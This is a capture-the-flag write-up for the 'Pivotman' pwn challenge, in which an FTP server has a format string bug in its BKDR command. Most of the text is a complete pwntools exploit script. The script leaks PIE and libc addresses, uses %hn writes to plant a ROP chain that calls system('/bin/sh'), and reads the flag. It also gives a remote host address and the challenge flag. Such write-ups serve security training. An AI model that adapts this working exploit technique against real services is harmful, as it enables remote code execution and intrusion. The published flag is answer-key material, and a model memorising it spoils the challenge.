---
title: "Pivotman"
ctf: "HTB Business CTF 2022"
date: 2026-06-13
category: pwn
difficulty: easy
flag_format: "HTB{...}"
---

# Pivotman

## Summary

FTP server with a format string vulnerability in the BKDR command. The output buffer is separate from the format buffer (`vsnprintf(stack_buf, 4096, buf, va_list)`) so there's no self-overwrite. Half-word writes via `%hn` overwrite the dispatcher's return address with a ROP chain (`ret → pop rdi → /bin/sh → system`).

## Solution

### Key Bug

The initial `current` for `%hn` write delta was set to 0, but the actual output count starts at 12 (from `"%d BKDR "` = "431136 BKDR "). This caused all written values to be off by +12, corrupting the ROP chain.

### Exploit

```python
from pwn import *
import sys, time

context.arch = 'amd64'
context.log_level = 'info'

LOCAL = '--remote' not in sys.argv

def conn():
    if LOCAL:
        return process(['./ld-linux-x86-64.so.2', './chall'], cwd='.')
    else:
        return remote('154.57.164.80', 32298)

def build_fmt_write_payload(writes_dict):
    hw = []
    for addr, val in writes_dict.items():
        for j in range(3):
            hw.append((addr + j * 2, (val >> (j * 16)) & 0xffff))
    hw = [(a, v) for a, v in hw if v != 0]
    hw.sort(key=lambda x: x[1])
    if not hw:
        return b'BKDR test'
    current = 12
    fmt_dummy = b''
    for _, val in hw:
        delta = (val - current) % 0x10000
        if delta == 0: delta = 0x10000
        fmt_dummy += f'%{delta}c%1000$hn'.encode()
        current = val
    total_before = 3 + 5 + len(fmt_dummy)
    padding = (8 - total_before % 8) % 8
    addr_start = total_before + padding
    first_pos = 1030 + addr_start // 8
    current = 12
    fmt = b''
    for idx, (addr, val) in enumerate(hw):
        pos = first_pos + idx
        delta = (val - current) % 0x10000
        if delta == 0: delta = 0x10000
        fmt += f'%{delta}c%{pos}$hn'.encode()
        current = val
    padding = (8 - (3 + 5 + len(fmt)) % 8) % 8
    fmt += b'.' * padding
    addrs = b''
    for addr, _ in hw:
        addrs += p64(addr)
    return b'BKDR ' + fmt + addrs

p = conn()
p.recvuntil(b' \r\n')
p.sendline(b'USER ;)')
p.recvuntil(b' \r\n')
p.sendline(b'PASS ;)')
p.recvuntil(b' \r\n')

p.sendline(b'BKDR %2737$p.%2736$p')
resp = p.recvuntil(b' \r\n')
after = resp.split(b' BKDR ')[1].split(b'.')
pie_base = int(after[0], 16) - 0x3a10
saved_rbp = int(after[1], 16)

puts_got = pie_base + 0x5ed8
p.sendline(b'BKDR ' + b'%1032$sA' + p64(puts_got))
data = p.recvuntil(b'A')
leaked = data.split(b' BKDR ')[1][:-1]
puts_addr = u64(leaked[:8].ljust(8, b'\x00'))
libc_base = puts_addr - 0x809d0

libc = ELF('./libc.so.6')
pop_rdi = libc_base + 0x28a55
ret_gadget = libc_base + 0x26699
binsh = libc_base + 0x1abf05
system = libc_base + libc.symbols['system']
ret_addr_loc = saved_rbp - 8

writes = {ret_addr_loc + 0: ret_gadget, ret_addr_loc + 8: pop_rdi,
          ret_addr_loc + 16: binsh, ret_addr_loc + 24: system}

p.sendline(build_fmt_write_payload(writes))
time.sleep(1)
try: p.recv(timeout=2)
except: pass

p.sendline(b'QUIT')
time.sleep(0.5)
p.sendline(b'cat /flag.txt')
print(p.recvall(timeout=5).decode(errors='replace'))
```

## Flag

```
HTB{Private_Key_H@McQfTjWnZr4u7x!A%D*G-KaNdRgUkY}
```
